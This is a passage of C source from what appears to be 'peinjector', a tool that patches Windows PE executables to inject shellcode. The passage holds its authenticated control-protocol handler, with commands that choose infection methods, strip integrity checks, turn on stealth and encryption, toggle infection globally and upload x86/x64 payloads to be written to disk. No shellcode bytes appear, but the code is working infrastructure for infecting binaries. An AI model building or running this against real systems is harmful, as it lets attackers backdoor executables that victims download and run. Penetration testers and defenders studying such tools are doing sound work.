  CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP = 0x16,
  CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP_ITERATIONS = 0x17,
  CMD_SEND_SET_ENCRYPT = 0x18,
  CMD_SEND_SET_ENCRYPT_ITERATIONS = 0x19,
  CMD_SEND_SET_TOKEN = 0x20,

  /* Response CMDs*/
  CMD_RECEIVE_SUCCESS = 0xFD,
  CMD_RECEIVE_ERROR = 0xFE,
} PEPROTOCOL_CMD;

/* Min/Max Macros */
#define MIN(_a, _b) ((_a) < (_b) ? (_a) : (_b))
#define MAX(_a, _b) ((_a) > (_b) ? (_a) : (_b))

/* PEPROTOCOL structure */
#pragma pack(1)
typedef struct _PEPROTOCOL {
  uint8_t token[32]; // access token
  uint8_t command;   // Command byte
  uint32_t size;     // Size of data
  char data[0];      // data
} PEPROTOCOL;
#pragma pack()

/* synchronized debugging */
static inline void __peserver_debug(PESERVER *server, int sock, char *msg, ...) {
# ifdef PESERVER_DEBUG_OUTPUT
  va_list args;
  va_start(args, msg);
  time_t timer;
  char buffer[29];
  struct tm* tm_info;
  time(&timer);

  /* Get time */
  tm_info = localtime(&timer);
  strftime(buffer, 29, "[%Y:%m:%d %H:%M:%S] ", tm_info);

  if (pthread_mutex_lock(&server->debug_mutex)) {
    return; /* Error locking mutex */
  }
  /* print timestamp */
  printf("%s", buffer);
  if (sock != 0) {
    printf("[SOCK:%d] ", sock);
  }
  /* Print message */
  vprintf(msg, args);
  fflush(stdout);
  pthread_mutex_unlock(&server->debug_mutex);
# endif
}

/* Checks characters in string. Filter: white-list: 0-9a-zA-Z ()-_,. */
static inline bool __peprotocol_check_string(char *mem, uint32_t memsize) {
  do {
    if (!(((*mem >= '0') && (*mem <= '9')) || ((*mem >= 'a') && (*mem <= 'z')) || ((*mem >= 'A') && (*mem <= 'z'))
        || (*mem == '(') || (*mem == ')') || (*mem == '-') || (*mem == '_') || (*mem == ',') || (*mem == '.')
        || (*mem == ' '))) {
      return false;
    }
    ++mem;
  } while (--memsize);

  return true;
}

/* Send success response */
static void inline __peprotocol_process_receive_success(PEPROTOCOL *protocol, int sock) {
  protocol->command = CMD_RECEIVE_SUCCESS;
  protocol->size = 0;
  send(sock, (const void*) protocol, sizeof(PEPROTOCOL), 0);
}

/* Send error response */
static void inline __peprotocol_process_receive_error(PEPROTOCOL *protocol, int sock) {
  protocol->command = CMD_RECEIVE_ERROR;
  protocol->size = 0;
  send(sock, (const void*) protocol, sizeof(PEPROTOCOL), 0);
}

/* Set command to success and echo message */
static void inline __peprotocol_process_echo(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  /* only change the command, send the same data back */
  protocol->command = CMD_RECEIVE_SUCCESS;
  send(sock, (const void*) protocol, (sizeof(PEPROTOCOL) + protocol->size), 0);
}

/* Restart server */
static void inline __peprotocol_process_restart(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 0) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }
  /* return a success message */
  __peprotocol_process_receive_success(protocol, sock);
  /* Restart */
  peserver_terminate(true, server);
}

/* Set section name for new infections */
static void inline __peprotocol_process_set_section_name(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  char *data_mem;

  /* Check whitelist chars */
  if (!__peprotocol_check_string(protocol->data, protocol->size)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  peinfect_set_sectionname(protocol->data, protocol->size, false, server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* allocate memory */
  data_mem = malloc(protocol->size + 1);

  if (data_mem != NULL) {
    /* Zero termination */
    data_mem[protocol->size] = 0x00;

    /* copy string into buffer */
    memcpy(data_mem, protocol->data, protocol->size);

    /* write data to ini */
    if (!ini_puts("name", "section_name", data_mem, server->config->config_name)) {
      /* return an error message */
      __peprotocol_process_receive_error(protocol, sock);

      /* free buffer after use */
      free(data_mem);
    } else {
      /* return a success message */
      __peprotocol_process_receive_success(protocol, sock);

      /* free buffer after use */
      free(data_mem);
    }
  } else {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Enable/Disable Change Flag Method */
static void inline __peprotocol_process_set_method_change_flags(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  peinfect_set_methods(
      protocol->data[0] ?
          (peinfect_get_methods(server->infect) | METHOD_CHANGE_FLAGS) :
          (peinfect_get_methods(server->infect) & ~METHOD_CHANGE_FLAGS), server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("methods", "method_change_flags", protocol->data[0], server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Enable/Disable New Section Method */
static void inline __peprotocol_process_set_method_new_section(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  peinfect_set_methods(
      protocol->data[0] ?
          (peinfect_get_methods(server->infect) | METHOD_NEW_SECTION) :
          (peinfect_get_methods(server->infect) & ~METHOD_NEW_SECTION), server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("methods", "method_new_section", protocol->data[0], server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Enable/Disable Alignment Resize Method */
static void inline __peprotocol_process_set_method_alignment_resize(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  peinfect_set_methods(
      protocol->data[0] ?
          (peinfect_get_methods(server->infect) | METHOD_ALIGNMENT_RESIZE) :
          (peinfect_get_methods(server->infect) & ~METHOD_ALIGNMENT_RESIZE), server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("methods", "method_alignment_resize", protocol->data[0], server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Enable/Disable Alignment Method */
static void inline __peprotocol_process_set_method_alignment(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  peinfect_set_methods(
      protocol->data[0] ?
          (peinfect_get_methods(server->infect) | METHOD_ALIGNMENT) :
          (peinfect_get_methods(server->infect) & ~METHOD_ALIGNMENT), server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("methods", "method_alignment", protocol->data[0], server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Enable/Disable Cross Section Jump Method */
static void inline __peprotocol_process_set_method_cross_section_jump(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  peinfect_set_methods(
      protocol->data[0] ?
          (peinfect_get_methods(server->infect) | METHOD_CROSS_SECTION_JUMP) :
          (peinfect_get_methods(server->infect) & ~METHOD_CROSS_SECTION_JUMP), server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("methods", "method_cross_section_jump", protocol->data[0], server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Set cross section jump iterations */
static void inline __peprotocol_process_set_method_cross_section_jump_iterations(PEPROTOCOL *protocol, PESERVER *server,
    int sock) {
  int *iterations = NULL;

  if (protocol->size != sizeof(int)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  iterations = (int *) protocol->data;
  peinfect_set_jumpiterations(*iterations, server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("methods", "method_cross_section_jump_iterations", *iterations, server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Enable/Disable encryption */
static void inline __peprotocol_process_set_encrypt(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  bool option = (protocol->data[0] != 0);
  peinfect_set_encrypt(option, server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("methods", "encrypt", option, server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Set encrypt iterations */
static void inline __peprotocol_process_set_encrypt_iterations(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  int *iterations = NULL;

  if (protocol->size != sizeof(int)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  iterations = (int *) protocol->data;
  peinfect_set_encryptiterations(*iterations, server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("methods", "encrypt_iterations", *iterations, server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Enable/Disable Remove Integrity Check */
static void inline __peprotocol_process_set_remove_integrity_check(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  bool option = (protocol->data[0] != 0);
  peinfect_set_removeintegrity(option, server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("integrity", "remove_integrity_check", option, server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Set listening data port */
static void inline __peprotocol_process_set_data_port(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  int *port = NULL;

  if (protocol->size != sizeof(int)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* Ports are persistent */
  if (server->persistent_ports) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  port = (int *) protocol->data;

  if (!ini_putl("server", "data_port", *port, server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Set listening data interface */
static void inline __peprotocol_process_set_data_interface(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("server", "data_interface", protocol->data[0], server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Set listening control port */
static void inline __peprotocol_process_set_control_port(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  int *port = NULL;

  if (protocol->size != sizeof(int)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* Ports are persistent */
  if (server->persistent_ports) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  port = (int *) protocol->data;

  if (!ini_putl("server", "control_port", *port, server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Set listening control interface */
static void inline __peprotocol_process_set_control_interface(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("server", "control_interface", protocol->data[0], server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Set x86 payload */
static void inline __peprotocol_process_set_payload_x86(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  peinfect_set_shellcode((unsigned char *) protocol->data, protocol->size, false, server->infect);

  /* lock the .bin-file */
  if (pthread_mutex_lock(&server->config->shellcode_x86_mutex)) {
    return; /* Error locking mutex */
  }

  /* Open file */
  FILE *sc = fopen(server->config->shellcode_x86_name, "w+b");

  if (sc != NULL) {
    /* write .bin-file */
    fwrite(protocol->data, 1, protocol->size, sc);
    fclose(sc);

    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  } else {

    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  }

  /* unlock the .bin-file */
  pthread_mutex_unlock(&server->config->shellcode_x86_mutex);
}

/* Set x64 payload */
static void inline __peprotocol_process_set_payload_x64(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  peinfect_set_shellcode((unsigned char *) protocol->data, protocol->size, true, server->infect);

  /* lock the .bin-file */
  if (pthread_mutex_lock(&server->config->shellcode_x64_mutex)) {
    return; /* Error locking mutex */
  }

  /* Open file */
  FILE *sc = fopen(server->config->shellcode_x64_name, "w+b");

  if (sc != NULL) {
    /* write .bin-file */
    fwrite(protocol->data, 1, protocol->size, sc);
    fclose(sc);

    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  } else {

    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  }

  /* unlock the .bin-file */
  pthread_mutex_unlock(&server->config->shellcode_x64_mutex);
}

/* read ini-file as binary and send it to the control server */
static void inline __peprotocol_process_get_config(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  unsigned char *file_mem;

  if (protocol->size != 0) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* Force write config */
  peserver_write_config(server);

  /* lock the config.ini */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* Open file */
  FILE *conf = fopen(server->config->config_name, "rb");

  if (conf != NULL) {
    /* Get file size and allocate buffer */
    fseek(conf, 0L, SEEK_END);
    size_t size = ftell(conf);
    size_t read_size = 0;
    rewind(conf);
    file_mem = malloc(size + sizeof(PEPROTOCOL));

    if (file_mem != NULL) {
      /* Load file into buffer */
      read_size = fread(file_mem + sizeof(PEPROTOCOL), size, 1, conf);
      fclose(conf);
      conf = NULL;

      /* Send the buffered config-file to the pe-control */
      if (read_size == 1) {
        memcpy(file_mem, protocol->token, PESERVER_TOKEN_SIZE);
        protocol = (PEPROTOCOL *) file_mem;
        protocol->command = CMD_RECEIVE_SUCCESS;
        protocol->size = size;
        send(sock, (const void*) protocol, (sizeof(PEPROTOCOL) + protocol->size), 0);
      }

      /* free buffer after use */
      free(file_mem);
    }

    /* Close file (if memory allocation has failed) */
    if (conf != NULL) {
      fclose(conf);
    }
  }
  /* unlock the config.ini */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Set x86 payload name */
static void inline __peprotocol_process_set_payload_name_x86(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  char *data_mem;

  /* Check whitelist chars */
  if (!__peprotocol_check_string(protocol->data, protocol->size)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* allocate memory */
  data_mem = malloc(protocol->size + 1);

  if (data_mem != NULL) {
    /* Zero termination */
    data_mem[protocol->size] = 0x00;

    /* copy string into buffer */
    memcpy(data_mem, protocol->data, protocol->size);

    /* write data to ini */
    if (!ini_puts("name", "payload_name_x86", data_mem, server->config->config_name)) {
      /* return an error message */
      __peprotocol_process_receive_error(protocol, sock);

      /* free buffer after use */
      free(data_mem);
    } else {
      /* return a success message */
      __peprotocol_process_receive_success(protocol, sock);

      /* free buffer after use */
      free(data_mem);
    }
  } else {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Enable/Disable try stealth */
static void inline __peprotocol_process_set_try_stay_stealth(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  bool option = (protocol->data[0] != 0);
  peinfect_set_trystaystealth(option, server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("integrity", "try_stay_stealth", option, server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Globally Enable/Disable Infection */
static void inline __peprotocol_process_set_enable(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  bool option = (protocol->data[0] != 0);
  peserver_enable_infection(option, server);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("server", "enable", option, server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Enable/Disable random section names */
static void inline __peprotocol_process_set_random_section_name(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 1) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  peinfect_set_sectionname(NULL, 0, true, server->infect);

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* write data to ini */
  if (!ini_putl("name", "section_name_random", protocol->data[0], server->config->config_name)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  } else {
    /* return a success message */
    __peprotocol_process_receive_success(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Shutdown server */
static void inline __peprotocol_process_shutdown(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != 0) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }
  /* return a success message */
  __peprotocol_process_receive_success(protocol, sock);
  /* Shutdown */
  peserver_terminate(false, server);
}

/* Set token */
static void inline __peprotocol_process_set_token(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  if (protocol->size != PESERVER_TOKEN_SIZE) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* Set token */
  if (!peserver_set_token((unsigned char *) protocol->data, PESERVER_TOKEN_SIZE, server)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* Force config write on token change */
  peserver_write_config(server);

  /* return a success message */
  __peprotocol_process_receive_success(protocol, sock);
}

/* Set x64 payload name */
static void inline __peprotocol_process_set_payload_name_x64(PEPROTOCOL *protocol, PESERVER *server, int sock) {
  char *data_mem;

  /* Check whitelist chars */
  if (!__peprotocol_check_string(protocol->data, protocol->size)) {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
    return;
  }

  /* set a lock */
  if (pthread_mutex_lock(&server->config->config_mutex)) {
    return; /* Error locking mutex */
  }

  /* allocate memory */
  data_mem = malloc(protocol->size + 1);

  if (data_mem != NULL) {
    /* Zero termination */
    data_mem[protocol->size] = 0x00;

    /* copy string into buffer */
    memcpy(data_mem, protocol->data, protocol->size);

    /* write data to ini */
    if (!ini_puts("name", "payload_name_x64", data_mem, server->config->config_name)) {
      /* return an error message */
      __peprotocol_process_receive_error(protocol, sock);

      /* free buffer after use */
      free(data_mem);
    } else {
      /* return a success message */
      __peprotocol_process_receive_success(protocol, sock);

      /* free buffer after use */
      free(data_mem);
    }
  } else {
    /* return an error message */
    __peprotocol_process_receive_error(protocol, sock);
  }

  /* set an unlock */
  pthread_mutex_unlock(&server->config->config_mutex);
}

/* Process PEPROTOCOL */
bool peprotocol_process_data(PESERVER *server, int sock, unsigned char *datamem, size_t datamemsize) {
  PEPROTOCOL *protocol = (PEPROTOCOL *) datamem;
  bool token_ok = true;
  size_t i = 0;

  /* Don't send any answer */
  if (datamemsize < 5) {
    return false;
  }

  /* Check authentication token size */
  if (datamemsize < PESERVER_TOKEN_SIZE) {
    __peserver_debug(server, sock, "[CRTL] Invalid token size\n");
    __peprotocol_process_receive_error(protocol, sock);
    return false;
  }

  /* Compare token */
  /* DON'T USE memcpy() AND DON'T break THE LOOP! (Timing attacks!) */
  for (i = 0; i < PESERVER_TOKEN_SIZE; ++i) {
    if (datamem[i] != server->token[i]) {
      token_ok = false;
    }
  }

  /* Check token */
  if (!token_ok) {
    __peserver_debug(server, sock, "[CRTL] Invalid token\n");
    __peprotocol_process_receive_error(protocol, sock);
    return false;
  }

  /* Check size of command */
  if (datamemsize != (sizeof(uint8_t) + sizeof(uint32_t) + PESERVER_TOKEN_SIZE + protocol->size)) {
    /* return an error message */
    __peserver_debug(server, sock, "[CRTL] Invalid command size\n");
    __peprotocol_process_receive_error(protocol, sock);
    return false;
  }

  /* Switch commands */
  switch (protocol->command) {
    case CMD_SEND_ECHO:
      __peserver_debug(server, sock, "[CRTL] Process echo\n");
      __peprotocol_process_echo(protocol, server, sock);
      break;

    case CMD_SEND_RESTART:
      __peserver_debug(server, sock, "[CRTL] Process restart\n");
      __peprotocol_process_restart(protocol, server, sock);
      break;

    case CMD_SEND_SET_SECTION_NAME:
      __peserver_debug(server, sock, "[CRTL] Process set section name\n");
      __peprotocol_process_set_section_name(protocol, server, sock);
      break;

    case CMD_SEND_SET_METHOD_CHANGE_FLAGS:
      __peserver_debug(server, sock, "[CRTL] Process set method change flags\n");
      __peprotocol_process_set_method_change_flags(protocol, server, sock);
      break;

    case CMD_SEND_SET_METHOD_NEW_SECTION:
      __peserver_debug(server, sock, "[CRTL] Process set method new section\n");
      __peprotocol_process_set_method_new_section(protocol, server, sock);
      break;

    case CMD_SEND_SET_METHOD_ALIGNMENT_RESIZE:
      __peserver_debug(server, sock, "[CRTL] Process set method alignment resize\n");
      __peprotocol_process_set_method_alignment_resize(protocol, server, sock);
      break;

    case CMD_SEND_SET_METHOD_ALIGNMENT:
      __peserver_debug(server, sock, "[CRTL] Process set method alignment\n");
      __peprotocol_process_set_method_alignment(protocol, server, sock);
      break;

    case CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP:
      __peserver_debug(server, sock, "[CRTL] Process set method cross section jump\n");
      __peprotocol_process_set_method_cross_section_jump(protocol, server, sock);
      break;

    case CMD_SEND_SET_METHOD_CROSS_SECTION_JUMP_ITERATIONS:
      __peserver_debug(server, sock, "[CRTL] Process set cross section jump iterations \n");
      __peprotocol_process_set_method_cross_section_jump_iterations(protocol, server, sock);
      break;

    case CMD_SEND_SET_REMOVE_INTEGRITY_CHECK:
      __peserver_debug(server, sock, "[CRTL] Process set remove integrity check\n");
      __peprotocol_process_set_remove_integrity_check(protocol, server, sock);
      break;

    case CMD_SEND_SET_DATA_PORT:
      __peserver_debug(server, sock, "[CRTL] Process set data port\n");
      __peprotocol_process_set_data_port(protocol, server, sock);
      break;

    case CMD_SEND_SET_DATA_INTERFACE:
      __peserver_debug(server, sock, "[CRTL] Process set data interface\n");
      __peprotocol_process_set_data_interface(protocol, server, sock);
      break;

    case CMD_SEND_SET_CONTROL_PORT:
      __peserver_debug(server, sock, "[CRTL] Process set control port\n");
      __peprotocol_process_set_control_port(protocol, server, sock);
      break;

    case CMD_SEND_SET_CONTROL_INTERFACE:
      __peserver_debug(server, sock, "[CRTL] Process set control interface\n");
      __peprotocol_process_set_control_interface(protocol, server, sock);
      break;

    case CMD_SEND_SET_PAYLOAD_X86:
      __peserver_debug(server, sock, "[CRTL] Process set payload x86\n");
      __peprotocol_process_set_payload_x86(protocol, server, sock);
      break;

    case CMD_SEND_SET_PAYLOAD_X64:
      __peserver_debug(server, sock, "[CRTL] Process set payload x64\n");
      __peprotocol_process_set_payload_x64(protocol, server, sock);
      break;

    case CMD_SEND_GET_CONFIG:
      __peserver_debug(server, sock, "[CRTL] Process get config\n");
      __peprotocol_process_get_config(protocol, server, sock);
      break;

    case CMD_SEND_SET_PAYLOAD_NAME_X86:
      __peserver_debug(server, sock, "[CRTL] Process set payload name x86\n");
      __peprotocol_process_set_payload_name_x86(protocol, server, sock);
      break;

    case CMD_SEND_SET_TRY_STAY_STEALTH:
      __peserver_debug(server, sock, "[CRTL] Process set try stealth\n");
      __peprotocol_process_set_try_stay_stealth(protocol, server, sock);
      break;

    case CMD_SEND_SET_ENABLE:
      __peserver_debug(server, sock, "[CRTL] Process set enable\n");
      __peprotocol_process_set_enable(protocol, server, sock);
      break;

    case CMD_SEND_SET_RANDOM_SECTION_NAME:
      __peserver_debug(server, sock, "[CRTL] Process set random section name\n");
      __peprotocol_process_set_random_section_name(protocol, server, sock);
      break;

    case CMD_SEND_SHUTDOWN:
      __peserver_debug(server, sock, "[CRTL] Process shutdown\n");
      __peprotocol_process_shutdown(protocol, server, sock);
      break;

    case CMD_SEND_SET_PAYLOAD_NAME_X64:
      __peserver_debug(server, sock, "[CRTL] Process set payload name x64\n");
      __peprotocol_process_set_payload_name_x64(protocol, server, sock);
      break;

    case CMD_SEND_SET_ENCRYPT:
      __peserver_debug(server, sock, "[CRTL] Process set encrypt\n");
      __peprotocol_process_set_encrypt(protocol, server, sock);
      break;

    case CMD_SEND_SET_ENCRYPT_ITERATIONS:
      __peserver_debug(server, sock, "[CRTL] Process set encrypt iterations\n");
      __peprotocol_process_set_encrypt_iterations(protocol, server, sock);
      break;

    case CMD_SEND_SET_TOKEN:
      __peserver_debug(server, sock, "[CRTL] Process set token\n");
      __peprotocol_process_set_token(protocol, server, sock);
      break;

    default:
      __peserver_debug(server, sock, "[CRTL] Invalid command\n");
      __peprotocol_process_receive_error(protocol, sock);
      break;
  }

  return false;
}

```

`peinjector/libpeprotocol.h`:

```h
/**
 * \file   libpeprotocol.h
 * \author A.G.
 * \brief
 */

#ifndef LIBPEPROTOCOL_H_
#define LIBPEPROTOCOL_H_

#include "libpeinfect.h"
#include "libpeserver.h"
#include <stdbool.h>
#include <pthread.h>

/**
 * Processes PE Control Protocol data
 *
 * \param server      PESERVER where the data was received
 * \param sock        Socket where the data was received
 * \param datamem     Received data
 * \param datamemsize Size of received data
 *
 * \return false
 */
bool peprotocol_process_data(PESERVER *server, int sock, unsigned char *datamem, size_t datamemsize);

#endif /* LIBPEPROTOCOL_H_ */


```

`peinjector/libpeserver.c`:

```c
/*
 * \file   libpefile.c
 * \author A.G.
 * \author A.A.
 * \brief  Provides PE patching functionality as server service
 */

#include "libpeserver.h"
#include "libpeprotocol.h"
#include "3rdparty/ini/minIni.h"
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdarg.h>
#include <time.h>
/* TLS Support */
#ifdef _WIN32 /* Windows/Linux Switch */
#include <winsock2.h>
#include <ws2tcpip.h>
#else
#include <sys/socket.h>
